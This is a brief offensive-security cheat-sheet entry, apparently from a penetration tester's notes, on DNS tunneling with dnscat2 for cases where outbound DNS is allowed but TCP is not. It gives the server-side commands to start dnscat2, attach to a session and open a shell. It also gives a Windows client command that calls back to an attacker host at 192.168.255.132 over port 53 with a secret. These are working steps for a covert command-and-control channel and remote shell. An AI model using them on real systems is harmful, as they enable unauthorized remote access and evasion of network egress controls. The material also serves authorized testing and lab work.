## DNS TUNNELING (Useful when outbound dns is allowed, but not tcp): <https://zeltser.com/c2-dns-tunneling/>

server: <https://github.com/iagox86/dnscat2>
ruby ./dnscat2.rb
(after callback)
session -i 1
shell
window -i 2

client: <https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip>
.\dnscat2-v0.07-client-win32.exe --dns server=192.168.255.132,port=53 --secret=976fce85725be5ba044786f36fa8ff36
